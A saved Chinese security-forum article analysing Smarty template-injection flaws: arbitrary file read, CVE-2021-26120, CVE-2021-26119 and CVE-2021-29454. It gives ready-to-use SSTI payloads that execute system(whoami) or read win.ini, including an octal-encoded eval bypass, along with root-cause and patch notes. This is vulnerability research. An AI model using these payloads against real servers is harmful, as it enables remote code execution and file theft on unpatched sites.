<!DOCTYPE html>
<!-- saved from url=(0035)https://xz.aliyun.com/t/11108#toc-1 -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <title>Smarty 最新 SSTI 总结 - 先知社区</title>
    <meta name="description" content="先知社区，先知安全技术社区">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <link rel="icon" href="https://xz.aliyun.com/static/icon/favicon.ico" type="image/x-icon">
    <link href="./Smarty 最新 SSTI 总结 - 先知社区_files/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="./Smarty 最新 SSTI 总结 - 先知社区_files/editormd.min.css">
    <link rel="stylesheet" href="./Smarty 最新 SSTI 总结 - 先知社区_files/tango.css">
    <link href="./Smarty 最新 SSTI 总结 - 先知社区_files/bootstrap-responsive.min.css" rel="stylesheet">
    <!-- Le styles -->
    <link rel="stylesheet" href="./Smarty 最新 SSTI 总结 - 先知社区_files/OverlayStyle.css">
    <link rel="stylesheet" href="./Smarty 最新 SSTI 总结 - 先知社区_files/topic.css">
    <link rel="stylesheet" href="./Smarty 最新 SSTI 总结 - 先知社区_files/beautify.css">
    
    <link rel="stylesheet" href="./Smarty 最新 SSTI 总结 - 先知社区_files/editormd.css">
    <link rel="stylesheet" href="./Smarty 最新 SSTI 总结 - 先知社区_files/tango.css">
    <link rel="stylesheet" href="./Smarty 最新 SSTI 总结 - 先知社区_files/jquery.fancybox.min.css">

    <!--[if lte IE 8]>
        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
    <![endif]-->
    
    

    <!--[if !IE]> -->
    <script type="text/javascript" src="./Smarty 最新 SSTI 总结 - 先知社区_files/jquery-2.1.3.min.js.下载"></script>
    
    
    <script src="./Smarty 最新 SSTI 总结 - 先知社区_files/jquery.fancybox.min.js.下载"></script>

    <!-- <![endif]-->
<style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
  position: absolute;
  top: 0;
  right: 0;
  left: 0;
  bottom: 0;
  z-index: 2147483647;
  display: flex;
  justify-content: center;
  align-items: center;
}

.immersive-translate-input-loading {
  --loading-color: #f78fb6;
  width: 6px;
  height: 6px;
  border-radius: 50%;
  display: block;
  margin: 12px auto;
  position: relative;
  color: white;
  left: -100px;
  box-sizing: border-box;
  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
}

@keyframes immersiveTranslateShadowRolling {
  0% {
    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  12% {
    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  25% {
    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  36% {
    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
  }

  50% {
    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
  }

  62% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
  }

  75% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
  }

  87% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
  }

  100% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
  }
}
</style></head>
<body>
<!-- navbar begin -->
<div class="navbar navbar-default">
    <div class="navbar-inner">
        <div class="container" style="text-align: center; position:relative;">
            <!--[if lte IE 8]>
            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
            <![endif]-->
            <div class="brand-box">
                <a class="brand" href="https://xz.aliyun.com/tab/1"></a>
            </div>
            
                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11108&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
                    登录</a>
            
            <div class="nav-collapse collapse">
                <div class="search d1 text-right">
                    <form method="get" action="https://xz.aliyun.com/search">
                        <input type="text" placeholder="搜索" name="keyword">
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
<!-- navbar end -->
<!-- main content begin -->
<div id="Wrapper" class="container">
    
    
    <div class="row2">
        <div class="span10">
            
    



    <script src="./Smarty 最新 SSTI 总结 - 先知社区_files/jquery.toc.min.js.下载"></script>
    <script src="./Smarty 最新 SSTI 总结 - 先知社区_files/toc.min.js.下载"></script>
    <script src="./Smarty 最新 SSTI 总结 - 先知社区_files/dt.js.下载"></script>
    


<div class="row box content">
    
    <div class="box-container">
        <div class="main-topic">
            <div class="clearfix user-info topic-list">
                <p><span class="content-title ">Smarty 最新 SSTI 总结</span>
                </p>
                <div class="topic-info">
                <span class="info-left">
                    <a href="https://xz.aliyun.com/u/39303">
                        <span class="username cell"> 阿巴阿巴</span></a> <span class="i-seprator"> / </span>
                    <span> 2022-04-06 09:55:21</span><span class="i-seprator"> / </span>
                    
                    <span>浏览数 4902</span>
                    
                    
                    <span class="content-node">
                    
                        <span class="label label-default label-node-first">
                            <a href="https://xz.aliyun.com/tab/1">技术文章</a></span>
                        <span class="label label-default">
                            <a href="https://xz.aliyun.com/node/11">技术文章</a></span>
                    
                    </span>
                </span>
                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(11108);">
             顶(1)</a>
             <a class="vote vote-down" href="javascript:" onclick="voteDown(11108);">
             踩(0)</a></span>
                </div>
            </div>
            <hr>
            <div id="topic_content" class="topic-content markdown-body">
                <h2 id="toc-0">前言</h2>
<p>本文章将对 Smarty 最新的漏洞做一下简单的分析与总结</p>
<h2 id="toc-1">Smarty 简介</h2>
<p>在开始介绍 Smarty 之前先了解一下模板引擎，模板引擎是为了让前端界面(html)与程序代码(php)分离而产生的一种解决方案，简单来说就是 html 文件里再也不用写 php 代码了。Smarty 的原理是变量替换原则，我们只需要在 html 文件里写好 Smarty 的标签即可，例如 {name}，然后调用 Smarty 的方法传递变量参数即可</p>
<h2 id="toc-2">环境搭建</h2>
<p>文章使用的 Smarty 版本根据漏洞而定，下载链接：<a href="https://github.com/smarty-php/smarty/releases?page=2" target="_blank" title="Smarty 下载">Smarty github</a> ，容器是 Windows 10 下的 phpstudy，php 版本是 7.3.4，安装很简单，下载源码解压后引入 Smarty.class.php 即可，如下所示，环境搭建相关的详细内容参见：<a href="https://blog.51cto.com/u_15072917/4666241" target="_blank" title="搭建详情">搭建详情</a></p>
<p><a id="img0" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327195507-bf2006aa-adc4-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327195507-bf2006aa-adc4-1.png"></a></p>
<h2 id="toc-3">开始复现</h2>
<h3 id="toc-4">任意文件读取</h3>
<ul>
<li>POC：<code>string:{include file='C:/Windows/win.ini'}</code></li>
<li>漏洞原因：<a href="https://www.smarty.net/docs/en/language.function.include.tpl" target="_blank" title="{include}">{include}</a> 标签所导致，被该标签引入的文件只会单纯的输出文件内容，就算引入 php 文件也是如此</li>
<li>版本限制：无</li>
</ul>
<p>引入普通文件：</p>
<p><a id="img1" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327200433-10d69968-adc6-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327200433-10d69968-adc6-1.png"></a></p>
<p>引入 php 文件：</p>
<p><a id="img2" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327200515-29c57430-adc6-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327200515-29c57430-adc6-1.png"></a></p>
<p>通过 templates_c 目录的模板编译文件可以看到为什么引入 php 文件只能输出内容，Smarty 会使用正则表达式去匹配 &lt;?php?&gt;，匹配到之后会使用单引号包裹。</p>
<p><a id="img3" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327200704-6ade1922-adc6-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327200704-6ade1922-adc6-1.png"></a></p>
<p><a id="img4" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327200726-77989688-adc6-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327200726-77989688-adc6-1.png"></a></p>
<h3 id="toc-5">CVE-2021-26120</h3>
<ul>
<li>POC：<code>string:{function name='x(){};system(whoami);function '}{/function}</code></li>
<li>漏洞原因：<a href="https://www.smarty.net/docs/en/language.function.function.tpl" target="_blank" title="{function}">{function}</a> 标签的 name 属性可以通过精心构造注入恶意代码</li>
<li>版本限制：在 3.1.39 版本修复，所以小于 3.1.39 能用</li>
</ul>
<p>测试效果</p>
<p><a id="img5" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327201820-fd5a5a76-adc7-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327201820-fd5a5a76-adc7-1.png"></a></p>
<p>查看 templates_c 目录下生成的模板编译文件</p>
<p><a id="img6" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327202212-8808cd1a-adc8-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327202212-8808cd1a-adc8-1.png"></a></p>
<p>导致漏洞的代码在 <code>libs/sysplugins/smarty_internal_compile_function.php#Smarty_Internal_Compile_Function-&gt;compile()</code></p>
<p><a id="img7" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327203034-b3116e62-adc9-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327203034-b3116e62-adc9-1.png"></a></p>
<p>查看 3.1.39 版本修复之后的代码，可以看到增加了正则限制 name 的内容，此时就无法注入恶意代码了</p>
<p><a id="img8" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327203207-ea619e5a-adc9-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327203207-ea619e5a-adc9-1.png"></a></p>
<h3 id="toc-6">CVE-2021-26119</h3>
<ul>
<li><p>POC:<br>
<code>string:{$smarty.template_object-&gt;smarty-&gt;_getSmartyObj()-&gt;display('string:{system(whoami)}')}</code><br>
<code>string:{$smarty.template_object-&gt;smarty-&gt;enableSecurity()-&gt;display('string:{system(whoami)}')}</code><br>
<code>string:{$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display('string:{system(whoami)}')}</code><br>
<code>string:{$smarty.template_object-&gt;smarty-&gt;addTemplateDir('./x')-&gt;display('string:{system(whoami)}')}</code><br>
<code>string:{$smarty.template_object-&gt;smarty-&gt;setTemplateDir('./x')-&gt;display('string:{system(whoami)}')}</code><br>
<code>string:{$smarty.template_object-&gt;smarty-&gt;addPluginsDir('./x')-&gt;display('string:{system(whoami)}')}</code><br>
<code>string:{$smarty.template_object-&gt;smarty-&gt;setPluginsDir('./x')-&gt;display('string:{system(whoami)}')}</code><br>
<code>string:{$smarty.template_object-&gt;smarty-&gt;setCompileDir('./x')-&gt;display('string:{system(whoami)}')}</code><br>
<code>string:{$smarty.template_object-&gt;smarty-&gt;setCacheDir('./x')-&gt;display('string:{system(whoami)}')}</code></p>
</li>
<li><p>漏洞原因：可以通过 {$smarty.template_object} 访问到 smarty 对象所导致</p>
</li>
<li>版本限制：这个漏洞还没有被修复，我试过最新版本 4.1.0 跟 3.1.44 都能注入恶意代码</li>
</ul>
<p>测试效果</p>
<p><a id="img9" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327204603-dc7b4e74-adcb-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327204603-dc7b4e74-adcb-1.png"></a></p>
<p>简单分析一下，触发漏洞之后，在 templates_c 目录下会生成两个模板编译文件，我们在第二个文件处执行 whoami 的位置下断点调试</p>
<p>第一个文件：</p>
<p><a id="img10" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327204814-2a906a0e-adcc-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327204814-2a906a0e-adcc-1.png"></a></p>
<p>第二个文件：</p>
<p><a id="img11" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327205149-ab21d324-adcc-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327205149-ab21d324-adcc-1.png"></a></p>
<p>可以看到第一次调用了第一个文件的函数 content_62405bd45e06b5_71225150</p>
<p><a id="img12" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327211259-9fd7ef1e-adcf-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327211259-9fd7ef1e-adcf-1.png"></a></p>
<p>第二次调用了第二个文件的函数 content_62405bd5572234_18969587，然后执行到恶意代码</p>
<p><a id="img13" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327211825-620de354-add0-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327211825-620de354-add0-1.png"></a></p>
<p>为什么不直接传入 POC:<code>string:{system(whoami)}</code> 到 $_POST['data']，而是要以上述这种方式，简单做一下演示就明白了。1.php 和 2.php 用于演示</p>
<p>1.php:</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">include_once</span><span class="p">(</span><span class="s1">'./libs/Smarty.class.php'</span><span class="p">);</span>
<span class="nv">$smarty</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Smarty</span><span class="p">();</span>
<span class="nv">$smarty</span><span class="o">-&gt;</span><span class="na">_getSmartyObj</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">'string:{system(whoami)}'</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>2.php:</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">include_once</span><span class="p">(</span><span class="s1">'./libs/Smarty.class.php'</span><span class="p">);</span>
<span class="nv">$smarty</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Smarty</span><span class="p">();</span>
<span class="nv">$smarty</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">'string{system(whoami)}'</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>然后用 burpsuite 访问这两个文件，你会发现 1.php 成功执行 whoami，而 2.php 却出现了报错，这里不做深究，如果感兴趣的话可以自己进行调试分析，通过简单的演示我们知道了 1.php 的写法可以注入恶意代码到模板编译文件</p>
<p><a id="img14" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327213131-369c6068-add2-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220327213131-369c6068-add2-1.png"></a></p>
<h3 id="toc-7">CVE-2021-29454</h3>
<ul>
<li>POC：<br>
<code>eval:{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'}</code></li>
<li>漏洞原因：<code>libs/plugins/function.math.php</code> 中的 <code>smarty_function_math</code> 执行了 eval()，而 eval() 的数据可以通过 8 进制数字绕过正则表达式</li>
<li>版本限制：在 3.1.42 和 4.0.2 中修复，小于这两个版本可用</li>
</ul>
<p>php 的 eval() 支持传入 8 或 16 进制数据，以下代码在 php7 版本都可以顺利执行，由于 php5 不支持 <code>(system)(whoami);</code> 这种方式执行代码，所以 php5 的 8 进制方式用不了：</p>
<div class="highlight"><pre><span></span><span class="x">eval('("\163\171\163\164\145\155")("\167\150\157\141\155\151");');</span>
<span class="x">eval("\x73\x79\x73\x74\x65\x6d\x28\x77\x68\x6f\x61\x6d\x69\x29\x3b");</span>
</pre></div>
<p>测试效果：</p>
<p><a id="img15" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220328110833-5a4dd416-ae44-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220328110833-5a4dd416-ae44-1.png"></a></p>
<p>漏洞代码位置 libs/plugins/function.math.php</p>
<p><a id="img16" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220328114205-0975ad8e-ae49-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220328114205-0975ad8e-ae49-1.png"></a></p>
<p>将版本修改为 3.1.42 然后调试，可以看到新增了正则判断修复了漏洞</p>
<p><a id="img17" href="./Smarty 最新 SSTI 总结 - 先知社区_files/20220328111347-1540e718-ae45-1.png"><img src="./Smarty 最新 SSTI 总结 - 先知社区_files/20220328111347-1540e718-ae45-1.png"></a></p>
<h2 id="toc-8">参考资料</h2>
<p><a href="http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smarty" target="_blank">http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smarty</a><br>
<a href="https://www.smarty.net/docs/en/" target="_blank">https://www.smarty.net/docs/en/</a></p>

            </div>
            

            <div class="post-user-action" style="margin-top: 34px;">
                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="11108">
                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">2</span>
                </span>
                
                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="11108">
                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">1</span>
                    </span>
                
                <div class="clearfix"></div>
            </div>
            
                <div class="related-section">
                    <div class="related-box">
                        
                            <span><a class="pull-left" href="https://xz.aliyun.com/t/11090" title="关于SSTI注入的二三事"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>关于SSTI注入的二三事</a></span>
                        
                        
                            <span><a class="pull-left" href="https://xz.aliyun.com/t/11118" title="DolphinPHP RCE漏洞分析"><span class="related-label" style="">下一篇：</span>DolphinPHP RCE漏洞分析</a></span>
                        
                    </div>
                </div>
            
        </div>
    </div>
</div>

    <!-- topic & appendix -->
    



<div class="row box">
    <ol class="breadcrumb">
        <li class="active">0 条回复</li>
    </ol>
    <div class="box-container post-container">
        
            <ul>
                <li style="min-height: 50px;line-height: 60px;margin-left: 15px"><strong>动动手指，沙发就是你的了！</strong></li>
            </ul>
        
    </div>
</div>


    <!-- posts of topic -->
    
        <div class="row box" id="reply-box">
            
            <div class="box-container clearfix">
                
                    <div class="reminder">
                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11108&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
                    </div>
                
            </div>
        </div>
    
    <!-- editor for post -->
    

        </div>
        <div class="span3 pull-right offset sidebar">
            


    <div class="box">
        <div class="info-panel">
            <p><strong>先知社区</strong></p>
            <hr>
            <p class="text-center login-btn">
                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11108&amp;from_type=xianzhi" class="btn">现在登录</a>
            </p>
        </div>
    </div>



    <div class="box">
        <div class="hot-node notice">
            <div class="info-body">
                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
            </div>
        </div>
    </div>


<div class="box">
    <div class="global-charts">
        <div id="chart-header">
            <div class="col-sm-4 text-center charts" data-type="year">
                年度贡献榜
            </div>
            <div class="text-center charts active" data-type="month">
                月度贡献榜
            </div>
            <div class="clearfix"></div>
        </div>
        <div id="chart_body">
            <div class="info-body" data-type="year">

                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./Smarty 最新 SSTI 总结 - 先知社区_files/37846_ed0c5102d8f11328a1.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/37846" title="儒道易行">儒道易行</a>
                            <span class="num-box">
                                <span class="badge badge-important">54</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./Smarty 最新 SSTI 总结 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/64113" title="Ic4_F1ame">Ic4_F1ame</a>
                            <span class="num-box">
                                <span class="badge badge-important">9</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./Smarty 最新 SSTI 总结 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/64530" title="OpenSCA社区">OpenSCA社区</a>
                            <span class="num-box">
                                <span class="badge badge-important">9</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./Smarty 最新 SSTI 总结 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/61452" title="遇见已经是最大的幸运">遇见已经是最大的幸运</a>
                            <span class="num-box">
                                <span class="badge badge-important">9</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./Smarty 最新 SSTI 总结 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/49027" title="hacker和小黑">hacker和小黑</a>
                            <span class="num-box">
                                <span class="badge badge-important">8</span>
                            </span>
                        </div>

                    </div>
                
            </div>
            <div class="info-body" data-type="month">
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./Smarty 最新 SSTI 总结 - 先知社区_files/15858_1a385b86ba5eb88d54.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/15858" title="pic4xiu" style="">pic4xiu</a>
                            <span class="num-box">
                                <span class="badge badge-important">4</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./Smarty 最新 SSTI 总结 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/54941" title="1794205309262390" style="">1794205309262390</a>
                            <span class="num-box">
                                <span class="badge badge-important">3</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./Smarty 最新 SSTI 总结 - 先知社区_files/49315_e954e2786775c5324a.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/49315" title="倩倩大魔王" style="">倩倩大魔王</a>
                            <span class="num-box">
                                <span class="badge badge-important">2</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./Smarty 最新 SSTI 总结 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/49710" title="忘川安全" style="">忘川安全</a>
                            <span class="num-box">
                                <span class="badge badge-important">2</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./Smarty 最新 SSTI 总结 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/70845" title="1000303887847998" style="">1000303887847998</a>
                            <span class="num-box">
                                <span class="badge badge-important">1</span>
                            </span>
                        </div>
                    </div>
                
            </div>
        </div>

    </div>
</div>

    <div class="box" id="toc-container" style="width: 257px;">
        <div class="panel-info">
            <div class="panel-heading">
                <h4>目录</h4>
            </div>
            <div id="toc">
                <div class="high-light" style="display: block; background-color: rgb(243, 243, 243); position: absolute; height: 26px; top: 50px;"></div>
            <ol style="top: 50px;"><li><a href="https://xz.aliyun.com/t/11108#toc-0">前言</a></li><li><a href="https://xz.aliyun.com/t/11108#toc-1">Smarty 简介</a></li><li><a href="https://xz.aliyun.com/t/11108#toc-2">环境搭建</a></li><li><a href="https://xz.aliyun.com/t/11108#toc-3">开始复现</a><ol><li><a href="https://xz.aliyun.com/t/11108#toc-4">任意文件读取</a></li><li><a href="https://xz.aliyun.com/t/11108#toc-5">CVE-2021-26120</a></li><li><a href="https://xz.aliyun.com/t/11108#toc-6">CVE-2021-26119</a></li><li><a href="https://xz.aliyun.com/t/11108#toc-7">CVE-2021-29454</a></li></ol></li><li><a href="https://xz.aliyun.com/t/11108#toc-8">参考资料</a></li></ol></div>
        </div>
    </div>
    <div style="clear: both;"></div>


    <script type="text/javascript">
        $(function () {
            $(".charts").click(switchChart);
            $("[data-toggle='tooltip']").tooltip();

            function switchChart() {
                let _this = $(this);
                let idx = _this.attr("data-type")
                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
                if (!_this.hasClass("active")) {
                    _this.addClass("active").siblings().removeClass("active")
                    content.show().siblings().hide()
                }
            }
        })
    </script>


    <style>

    </style>


        </div>
    </div>


</div>
<footer class="bs-docs-footer" translate="no">
    <div class="container text-center">
        <div class="links">
            <a href="https://xz.aliyun.com/feed" target="_blank">RSS</a>
            <a href="https://xz.aliyun.com/about" target="_blank"><span>关于社区</span></a>
            <a href="https://xz.aliyun.com/partner" target="_blank"><span>友情链接</span></a>
            <a href="https://xz.aliyun.com/notice">社区小黑板</a>
            <a href="https://report.aliyun.com/" target="_blank">举报中心</a>
            <a href="https://www.aliyun.com/complaint" target="_blank">我要投诉</a>
        </div>
    </div>
</footer>

<script src="./Smarty 最新 SSTI 总结 - 先知社区_files/bootstrap.min.js.下载"></script>
<script src="./Smarty 最新 SSTI 总结 - 先知社区_files/xz.js.下载"></script>


    
    <script type="text/javascript">
        $(document).ready(function () {
            voteUp = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/up/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11108&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-up').html(data.html);
                                }
                            }
                        }
                    });
                }
            };
            voteDown = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/down/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11108&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-down').html(data.html);
                                }
                            }

                        }
                    });
                }
            };
            
            $("[data-toggle='tooltip']").tooltip();
        });
    </script>


    <script src="./Smarty 最新 SSTI 总结 - 先知社区_files/z_stat.php"></script>


</body></html>